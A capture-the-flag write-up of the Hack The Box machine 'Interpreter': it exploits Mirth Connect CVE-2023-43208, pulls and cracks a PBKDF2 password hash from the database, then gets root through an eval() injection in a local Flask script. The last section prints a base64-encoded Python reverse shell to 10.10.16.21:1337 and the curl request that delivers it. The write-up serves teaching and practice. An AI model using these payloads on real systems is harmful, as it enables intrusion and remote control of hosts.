@@ -1,0 +1,769 @@
+---
+title: HTB - Interpreter (Medium)
+date: '2026-02-23'
+tags: ['machine', 'linux', 'PBKDF2', 'SSTI', 'port-forwarding', 'regex']
+draft: false
+summary: The target runs a version of NextGen Healthcare Mirth Connect that is vulnerable to CVE-2023-43208 which allows for initial foothold. DB enumeration reveals a user credential encrypted in PBKDF2-HMAC-SHA256 which requires some decoding and cracking. Thus, gaining user access. Then, acquired root by identifying an SSTI vulnerability of unsafe user input validation within a custom script for Mirth Connect 
+images: /static/images/htb/linux/interpreter/interpreter.png
+---
+
+
+
+![Description](/static/images/htb/linux/interpreter/interpreter.png)
+
+
+
+<TOCInline toc={props.toc} asDisclosure />
+
+
+## Scanning
+
+```bash
+❯ nmap -sV -sC --min-rate=1000 10.129.138.239
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-22 18:33 UTC
+Nmap scan report for interpreter.htb (10.129.138.239)
+Host is up (0.12s latency).
+Not shown: 987 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE        VERSION
+22/tcp    open     ssh            OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
+| ssh-hostkey: 
+|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
+|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
+80/tcp    open     http
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Mirth Connect Administrator
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 458
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+|     <title>Error 404 Not Found</title>
+|     </head>
+|     <body><h2>HTTP ERROR 404 Not Found</h2>
+|     <table>
+|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
+|     <tr><th>STATUS:</th><td>404</td></tr>
+|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
+|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
+|     </table>
+|     </body>
+|     </html>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 22 Feb 2026 18:36:50 GMT
+|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 2532
+|     <!doctype html>
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+|     <meta http-equiv="x-ua-compatible" content="IE=edge">
+|     <meta http-equiv="cache-control" content="no-cache">
+|     <meta http-equiv="cache-control" content="no-store">
+|     <title>Mirth Connect Administrator</title>
+|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
+|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
+|     <link rel="stylesheet" type="text/css" href="css/main.css" />
+|     <script type="text/javascript">
+|     Break out of frame if inside a frame. */
+|     (window != window.top) {
+|     window.top.location = window.location;
+|     </script>
+|     <script type="text/javascript" sr
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 22 Feb 2026 18:36:50 GMT
+|     Allow: GET, HEAD, TRACE, OPTIONS
+|   RTSPRequest: 
+|     HTTP/1.1 505 Unknown Version
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 58
+|     Connection: close
+|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
+|   X11Probe: 
+|     HTTP/1.1 400 Illegal character CNTL=0x0
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 69
+|     Connection: close
+|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x0</pre>
+443/tcp   open     ssl/https
+| http-methods: 
+|_  Potentially risky methods: TRACE
+| ssl-cert: Subject: commonName=mirth-connect
+| Not valid before: 2025-09-19T12:50:05
+|_Not valid after:  2075-09-19T12:50:05
+|_http-title: Mirth Connect Administrator
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.1 404 Not Found
+|     Cache-Control: must-revalidate,no-cache,no-store
+|     Content-Type: text/html;charset=iso-8859-1
+|     Content-Length: 458
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
+|     <title>Error 404 Not Found</title>
+|     </head>
+|     <body><h2>HTTP ERROR 404 Not Found</h2>
+|     <table>
+|     <tr><th>URI:</th><td>/nice%20ports%2C/Tri%6Eity.txt%2ebak</td></tr>
+|     <tr><th>STATUS:</th><td>404</td></tr>
+|     <tr><th>MESSAGE:</th><td>Not Found</td></tr>
+|     <tr><th>SERVLET:</th><td>org.eclipse.jetty.servlet.ServletHandler$Default404Servlet-7a56a372</td></tr>
+|     </table>
+|     </body>
+|     </html>
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 22 Feb 2026 18:36:57 GMT
+|     Last-Modified: Tue, 18 Jul 2023 17:46:18 GMT
+|     Content-Type: text/html
+|     Accept-Ranges: bytes
+|     Content-Length: 2532
+|     <!doctype html>
+|     <html>
+|     <head>
+|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+|     <meta http-equiv="x-ua-compatible" content="IE=edge">
+|     <meta http-equiv="cache-control" content="no-cache">
+|     <meta http-equiv="cache-control" content="no-store">
+|     <title>Mirth Connect Administrator</title>
+|     <link rel="shortcut icon" type="image/x-icon" href="images/NG_MC_Icon_16x16.png" />
+|     <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />
+|     <link rel="stylesheet" type="text/css" href="css/main.css" />
+|     <script type="text/javascript">
+|     Break out of frame if inside a frame. */
+|     (window != window.top) {
+|     window.top.location = window.location;
+|     </script>
+|     <script type="text/javascript" sr
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Sun, 22 Feb 2026 18:36:58 GMT
+|_    Allow: GET, HEAD, TRACE, OPTIONS
+|_ssl-date: TLS randomness does not represent time
+900/tcp   filtered omginitialrefs
+990/tcp   filtered ftps
+1047/tcp  filtered neod1
+1119/tcp  filtered bnetgame
+1524/tcp  filtered ingreslock
+4443/tcp  filtered pharos
+5214/tcp  filtered unknown
+13783/tcp filtered netbackup
+49152/tcp filtered unknown
+64680/tcp filtered unknown
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+...
+...
+...
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 83.73 seconds
+```
+
+
+Apart from the filtered ports, we can see there is a web instance on 80 and 443. Let's check that out
+
+
+
+## Enumeration
+
+We are greeted with Mirth Connect which is a open-source interface engine for healthcare data integration.
+
+![Description](/static/images/htb/linux/interpreter/1.png)
+
+ 
+
+Clicking the 'Access Secure Site' will redirect us to the HTTPS port where the self-signed certificate is enforced. Upon landing,
+we can observe there is a login portal. Attempting default credentials `admin:admin` will not prove successful
+
+![Description](/static/images/htb/linux/interpreter/2.png)
+
+
+If we click on the 'Launch Mirth Connect Administrator', we will some sort of a configuration file for the Mirth Connect Launcher. The downloaded Java file, 
+`webstart.jnlp` reveals the version of the running Mirth Connect instance
+
+![Description](/static/images/htb/linux/interpreter/3.png)
+
+
+
+
+
+## Searching for Public Exploits
+
+
+A quick google search will reveal there is an existing vulnerability which is an Unauthenticated Remote Code Execution (RCE) that affects
+Mirth Connect versions prior to 4.4.1, dubbed CVE-2023-43208. The vulnerability is caused by insecure deserialization within the Mirth Connect API
+that uses the `XStream` Java library to convert XML data into Java objects 
+
+
+There is also an existing POC for the exploit:
+
+
+https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT
+
+
+![Description](/static/images/htb/linux/interpreter/4.png)
+
+
+
+
+## Gaining Access
+
+
+The POC requires some tweaking of the `requirements.txt` file:
+
+```bash
+alive_progress==3.1.4
+
+packaging==20.9,<21.0
+#packaging==24.0
+
+pwncat-cs==0.5.4
+requests==2.31.0
+
+rich==10.4,<11
+#rich==13.7.1
+```
+
+
+I was having issues with the `pwncat` library within the POC so I just started my `penelope` listener to catch the shell instead
+
+```bash
+penelope -p 1234
+```
+
+
+Also for some reason, the POC script didn't like `python3.13` so I just used `python3.10`
+
+```bash
+python3.10 CVE-2023-43208.py -u https://interpreter.htb -lh 10.10.16.21 -lp 1234
+```
+
+![Description](/static/images/htb/linux/interpreter/5.png)
+
+Observe our listener has caught the shell
+
+![Description](/static/images/htb/linux/interpreter/6.png)
+
+
+
+
+
+### Extracting Database Credentials
+
+
+According to AI, the database configuration is stored in a file called `mirth.properties` in the `%MIRTH_HOME%/conf` directory
+
+![Description](/static/images/htb/linux/interpreter/7.png)
+
+![Description](/static/images/htb/linux/interpreter/8.png)
+
+
+Let's connect to the local database and query available data
+
+```bash
+mysql -u mirthdb -pMirthPass123!
+```
+
+![Description](/static/images/htb/linux/interpreter/9.png)
+
+
+Show available databases
+
+```sql
+MARIADB [(none)]> show databases;
+```
+
+![Description](/static/images/htb/linux/interpreter/10.png)
+
+
+Apart from the database schema, let's connect to the `mc_bdd_prod` DB
+
+```sql
+MARIADB [(none)]> use mc_bdd_prod;
+```
+
+Show available tables
+
+
+```sql
+MARIADB [mc_bdd_prod]> show tables;
+```
+
+![Description](/static/images/htb/linux/interpreter/11.png)
+
+
+We are most interested in these two tables which should show valuable information. Proceed to query them
+
+
+```sql
+MARIADB [mc_bdd_prod]> select * from PERSON;
+```
+
+![Description](/static/images/htb/linux/interpreter/12.png)
+
+
+We have a user named `sedric` which exists in the current target
+
+```bash
+ls /home
+
+sedric
+````
+
+
+```sql
+MARIADB [mc_bdd_prod]> select * from PERSON_PASSWORD;
+```
+
+![Description](/static/images/htb/linux/interpreter/13.png)
+
+Password hash found is `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`
+
+
+### Cracking PBKDF2-HMAC-SHA256 hash
+
+
+According to the [docs](https://docs.nextgen.com/en-US/mirthc2ae-connect-by-nextgen-healthcare-user-guide-3281761/default-digest-algorithm-in-mirthc2ae-connect-4-4-62159),
+the hash algorithm used is PBKDF2-HMAC-SHA256 with the iteration being 600000. On another [blog](https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256). the hash requires a salt value of which according to the
+[docs](https://docs.nextgen.com/en-US/mirthc2ae-connect-by-nextgen-healthcare-user-guide-3281761/update-the-digest-algorithm-63521)
+is 8
+
+
+```bash
+  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
+                        |    | |  | |      | |                              |
+                        '-|--' '-|' '---|--' '----------------|-------------'
+                          |      |      |                     '.______Base64-Encoded Hash
+                          |      |      |
+                          |      |      '._________Base64-Encoded Salt
+                          |      |
+                          |      '._______ Number of Iterations
+                          |
+                          '._____ Algorithm
+```
+
+
+So the hash structure we are looking for will be like this:
+
+```bash
+sha256:60000:<SALT>:<HASH>
+```
+
+
+but since the database hash is encoded with Base64, we will need to decode it to raw bytes using this script. It basically
+decodes the 8-byte salt and password hash portion and arranges them to the correct format:
+
+```python
+import base64
+
+hash_value = "u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w=="
+
+
+
+data = base64.b64decode(hash_value)
+
+salt = base64.b64encode(data[:8]).decode()
+
+hash_ = base64.b64encode(data[8:]).decode()
+
+
+
+print(f'Clean Hash: sha256:600000{salt}{hash_}')
+```
+
+
+
+![Description](/static/images/htb/linux/interpreter/14.png)
+
+
+
+Take that hash and save it in a file called `hash.txt` and crack it with hashcat
+
+```bash
+hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+![Description](/static/images/htb/linux/interpreter/15.png)
+
+
+SSH into `sedric` and grab the user flag
+
+![Description](/static/images/htb/linux/interpreter/16.png)
+
+
+
+
+
+
+## Privilege Escalation
+
+
+We can use this script to enumerate for available scripts and configuration files
+
+```bash
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+
+```bash
+File extension:  .py
+/etc/python3.11/sitecustomize.py
+/etc/fail2ban/action.d/smtp.py
+/usr/local/bin/notif.py
+
+File extension:  .pyc
+
+File extension:  .pl
+/etc/vmware-tools/xsession-xdm.pl
+/usr/bin/vmware-config-tools.pl
+/usr/bin/vmware-uninstall-tools.pl
+
+File extension:  .go
+
+File extension:  .jar
+/usr/local/mirthconnect/.install4j/launcher22b29c53.jar
+/usr/local/mirthconnect/.install4j/launcher2bfa42ba.jar
+/usr/local/mirthconnect/.install4j/launcher69b090a9.jar
+/usr/local/mirthconnect/.install4j/launcher0.jar
+/usr/local/mirthconnect/.install4j/launchere0d19a47.jar
+/usr/local/mirthconnect/.install4j/launcher7f3d482e.jar
+/usr/local/mirthconnect/.install4j/i4jruntime.jar
+/usr/local/mirthconnect/.install4j/user.jar
+/usr/local/mirthconnect/.install4j/user/installer-util.jar
+/usr/local/mirthconnect/.install4j/user/flatlaf.jar
+/usr/local/mirthconnect/mirth-server-launcher.jar
+/usr/local/mirthconnect/extensions/datatype-hl7v2/datatype-hl7v2-server.jar
+/usr/local/mirthconnect/extensions/datatype-hl7v2/datatype-hl7v2-client.jar
+/usr/local/mirthconnect/extensions/dashboardstatus/dashboardstatus-client.jar
+/usr/local/mirthconnect/extensions/dashboardstatus/dashboardstatus-server.jar
+/usr/local/mirthconnect/extensions/destinationsetfilter/destinationsetfilter-client.jar
+/usr/local/mirthconnect/extensions/datatype-hl7v3/datatype-hl7v3-client.jar
+/usr/local/mirthconnect/extensions/datatype-hl7v3/datatype-hl7v3-server.jar
+/usr/local/mirthconnect/extensions/rulebuilder/rulebuilder-client.jar
+/usr/local/mirthconnect/extensions/imageviewer/imageviewer-client.jar
+/usr/local/mirthconnect/extensions/jdbc/jdbc-server.jar
+/usr/local/mirthconnect/extensions/jdbc/jdbc-client.jar
+/usr/local/mirthconnect/extensions/mapper/mapper-client.jar
+/usr/local/mirthconnect/extensions/javascriptrule/javascriptrule-client.jar
+/usr/local/mirthconnect/extensions/dicomviewer/dicomviewer-client.jar
+/usr/local/mirthconnect/extensions/directoryresource/directoryresource-client.jar
+/usr/local/mirthconnect/extensions/directoryresource/directoryresource-server.jar
+/usr/local/mirthconnect/extensions/pdfviewer/pdfviewer-client.jar
+/usr/local/mirthconnect/extensions/scriptfilestep/scriptfilestep-client.jar
+/usr/local/mirthconnect/extensions/datatype-raw/datatype-raw-client.jar
+/usr/local/mirthconnect/extensions/datatype-raw/datatype-raw-server.jar
+/usr/local/mirthconnect/extensions/xsltstep/xsltstep-client.jar
+/usr/local/mirthconnect/extensions/datatype-ncpdp/datatype-ncpdp-server.jar
+/usr/local/mirthconnect/extensions/datatype-ncpdp/datatype-ncpdp-client.jar
+/usr/local/mirthconnect/extensions/smtp/smtp-client.jar
+/usr/local/mirthconnect/extensions/smtp/smtp-server.jar
+/usr/local/mirthconnect/extensions/scriptfilerule/scriptfilerule-client.jar
+/usr/local/mirthconnect/extensions/httpauth/httpauth-client.jar
+/usr/local/mirthconnect/extensions/httpauth/src/httpauth-userutil-sources.jar
+/usr/local/mirthconnect/extensions/httpauth/httpauth-server.jar
+/usr/local/mirthconnect/extensions/vm/vm-client.jar
+/usr/local/mirthconnect/extensions/vm/vm-server.jar
+/usr/local/mirthconnect/extensions/tcp/tcp-client.jar
+/usr/local/mirthconnect/extensions/tcp/tcp-server.jar
+/usr/local/mirthconnect/extensions/extensionmanager/extensionmanager-client.jar
+/usr/local/mirthconnect/extensions/messagebuilder/messagebuilder-client.jar
+/usr/local/mirthconnect/extensions/javascriptstep/javascriptstep-client.jar
+/usr/local/mirthconnect/extensions/ws/ws-client.jar
+/usr/local/mirthconnect/extensions/ws/ws-server.jar
+/usr/local/mirthconnect/extensions/datatype-delimited/datatype-delimited-client.jar
+/usr/local/mirthconnect/extensions/datatype-delimited/datatype-delimited-server.jar
+/usr/local/mirthconnect/extensions/datatype-json/datatype-json-client.jar
+/usr/local/mirthconnect/extensions/datatype-json/datatype-json-server.jar
+/usr/local/mirthconnect/extensions/http/http-client.jar
+/usr/local/mirthconnect/extensions/http/http-server.jar
+/usr/local/mirthconnect/extensions/datatype-xml/datatype-xml-client.jar
+/usr/local/mirthconnect/extensions/datatype-xml/datatype-xml-server.jar
+/usr/local/mirthconnect/extensions/datatype-dicom/datatype-dicom-server.jar
+/usr/local/mirthconnect/extensions/datatype-dicom/datatype-dicom-client.jar
+/usr/local/mirthconnect/extensions/js/js-client.jar
+/usr/local/mirthconnect/extensions/js/js-server.jar
+/usr/local/mirthconnect/extensions/file/file-server.jar
+/usr/local/mirthconnect/extensions/file/file-client.jar
+/usr/local/mirthconnect/extensions/dicom/dicom-server.jar
+/usr/local/mirthconnect/extensions/dicom/dicom-client.jar
+/usr/local/mirthconnect/extensions/textviewer/textviewer-client.jar
+/usr/local/mirthconnect/extensions/globalmapviewer/globalmapviewer-client.jar
+/usr/local/mirthconnect/extensions/globalmapviewer/globalmapviewer-server.jar
+/usr/local/mirthconnect/extensions/datapruner/datapruner-client.jar
+/usr/local/mirthconnect/extensions/datapruner/datapruner-server.jar
+/usr/local/mirthconnect/extensions/mllpmode/mllpmode-client.jar
+/usr/local/mirthconnect/extensions/mllpmode/mllpmode-server.jar
+/usr/local/mirthconnect/extensions/datatype-edi/datatype-edi-client.jar
+/usr/local/mirthconnect/extensions/datatype-edi/datatype-edi-server.jar
+/usr/local/mirthconnect/extensions/jms/jms-client.jar
+/usr/local/mirthconnect/extensions/jms/jms-server.jar
+/usr/local/mirthconnect/extensions/serverlog/serverlog-client.jar
+/usr/local/mirthconnect/extensions/serverlog/serverlog-server.jar
+
+File extension:  .c
+
+File extension:  .sh
+/etc/rc0.d/K01hwclock.sh
+/etc/rc4.d/S01console-setup.sh
+/etc/rc6.d/K01hwclock.sh
+/etc/rcS.d/S01hwclock.sh
+/etc/rcS.d/S01keyboard-setup.sh
+/etc/vmware-tools/xsession-xdm.sh
+/etc/vmware-tools/xsession-gdm.sh
+/etc/vmware-tools/installer.sh
+/etc/rc5.d/S01console-setup.sh
+/etc/rc2.d/S01console-setup.sh
+/etc/wpa_supplicant/ifupdown.sh
+/etc/wpa_supplicant/action_wpa.sh
+/etc/wpa_supplicant/functions.sh
+/etc/rc3.d/S01console-setup.sh
+/etc/init.d/console-setup.sh
+/etc/init.d/hwclock.sh
+/etc/init.d/keyboard-setup.sh
+/etc/console-setup/cached_setup_font.sh
+/etc/console-setup/cached_setup_keyboard.sh
+/etc/console-setup/cached_setup_terminal.sh
+/etc/profile.d/gawk.sh
+/etc/profile.d/bash_completion.sh
+/usr/bin/gettext.sh
+/boot/grub/i386-pc/modinfo.sh
+```
+
+
+The file that stands out is `/usr/local/bin/notif.py` let's check that out
+
+
+
+
+### Custom Script Analysis
+
+
+```python
+#!/usr/bin/env python3
+"""
+Notification server for added patients.
+This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
+It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
+It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
+"""
+from flask import Flask, request, abort
+import re
+import uuid
+from datetime import datetime
+import xml.etree.ElementTree as ET, os
+
+app = Flask(__name__)
+USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)
+
+def template(first, last, sender, ts, dob, gender):
+    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
+    for s in [first, last, sender, ts, dob, gender]:
+        if not pattern.fullmatch(s):
+            return "[INVALID_INPUT]"
+    # DOB format is DD/MM/YYYY
+    try:
+        year_of_birth = int(dob.split('/')[-1])
+        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
+            return "[INVALID_DOB]"
+    except:
+        return "[INVALID_DOB]"
+    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
+    try:
+        return eval(f"f'''{template}'''")
+    except Exception as e:
+        return f"[EVAL_ERROR] {e}"
+
+@app.route("/addPatient", methods=["POST"])
+def receive():
+    if request.remote_addr != "127.0.0.1":
+        abort(403)
+    try:
+        xml_text = request.data.decode()
+        xml_root = ET.fromstring(xml_text)
+    except ET.ParseError:
+        return "XML ERROR\n", 400
+    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
+    if patient is None:
+        return "No <patient> tag found\n", 400
+    id = uuid.uuid4().hex
+    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
+    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
+    path = os.path.join(USER_DIR,f"{id}.txt")
+    with open(path,"w") as f:
+        f.write(notification+"\n")
+    return notification
+
+if __name__=="__main__":
+    app.run("127.0.0.1",54321, threaded=True)
+```
+
+
+It seems like it is a custom Python script to add a patient to the Mirth Connect instance by making
+an HTTP XML request at the `/addPatient` route which is running locally on port 54321. Inspecting the
+running process on the script reveals that it is ran by `root`
+
+```bash
+ps aux | grep notif.py
+```
+
+![Description](/static/images/htb/linux/interpreter/17.png)
+
+
+Port 54321 is also confirmed to be running locally
+
+```bash
+ss -tlnp
+```
+
+![Description](/static/images/htb/linux/interpreter/18.png)
+
+
+
+Further analysis we can observe a critical vulnerability in the custom script at this specific line:
+
+```python
+return eval(f"f'''{template}'''")
+```
+
+it uses `eval()` directly on user input. Looking also the library which is `Flask`, it is a safe bet to say this is an SSTI vulnerability.
+
+
+
+
+### Port forwarding
+
+I would prefer to use `curl` to make the crafted request at the `/addPatient` route but since `curl` is not available on the target,
+I will port forward port 54321 to my local machine
+
+
+```bash
+ssh -L 54321:localhost:54321 sedric@interpreter.htb
+```
+
+
+Confirm that is running on our local machine
+
+```bash
+netstat -antp | grep 54321
+```
+
+![Description](/static/images/htb/linux/interpreter/19.png)
+
+
+
+### Exploiting SSTI and Bypassing Regex
+
+
+
+```python
+    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
+
+    if patient is None:
+        return "No <patient> tag found\n", 400
+
+    id = uuid.uuid4().hex
+
+    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
+```
+
+Based on this snippet from the script, the XML request would look something like this:
+
+```xml
+<patient>
+    <firstname>placeholder</firstname>
+    <lastname>placeholder</lastname>
+    <sender_app>placeholder</sender_app>
+    <timestamp>placeholder</timestamp>
+    <birth_date>DD/MM/YYYY</birth_date>
+    <gender>placeholder</gender>
+</patient>
+```
+
+All of the fields would be vulnerable to SSTI except the `birth_date` field. Let's craft a test request using `curl`. Since the `*`
+character is not allowed I would use `+` to test for SSTI
+
+```bash
+curl -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<patient>
+<firstname>{7+7}</firstname>
+<lastname>lol</lastname>
+<sender_app>jamil_test</sender_app>
+<timestamp>pwned</timestamp>
+<birth_date>07/07/1975</birth_date>
+<gender>male</gender>
+</patient>'
+```
+
+![Description](/static/images/htb/linux/interpreter/20.png)
+
+It worked now we can move on to get a reverse shell. The second problem is the regex implements a whitelist of these characters:
+
+- Letters: a-z, A-Z
+- Numbers: 0-9
+- Special characters: 
+
+```
+. _ ' " ( ) { } = + /
+```
+
+
+So to resolve this issue, I would just encode my reverse shell payload in Base64 and decode them back. I will use this Python3 #2 payload
+from revshells.com
+
+
+```Python
+## Before Base64 Encode
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.21",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+## After Base64 Encode
+
+cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjIxIiwxMzM3KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=
+
+```
+
+
+Start our listener
+
+```bash
+nc -lvnp 1337
+```
+
+Send the payload. We also need to take in consideration of whitespace as it is not allowed
+
+```bash
+curl -X POST http://127.0.0.1:54321/addPatient -H "Content-Type: application/xml" -d '<patient>
+<firstname>{__import__("os").system(__import__("base64").b64decode("cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjIxIiwxMzM3KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKSc=").decode())}</firstname> 
+<lastname>Jamil</lastname>
+<sender_app>jamil_test</sender_app>
+<timestamp>pwned</timestamp>
+<birth_date>07/07/1975</birth_date>
+<gender>male</gender>
+</patient>'
+```
+
+The request will hang but notice our listener has caught the shell as `root`
+
+
+![Description](/static/images/htb/linux/interpreter/21.png)
+
+
+
+
+---
+
+## Sources
+
+- https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208
+- https://docs.nextgen.com/en-US/mirthc2ae-connect-by-nextgen-healthcare-user-guide-3281761/default-digest-algorithm-in-mirthc2ae-connect-4-4-62159
+- https://forums.mirthproject.io/forum/mirth-connect/support/3255-reset-admin-password
+- https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256
+
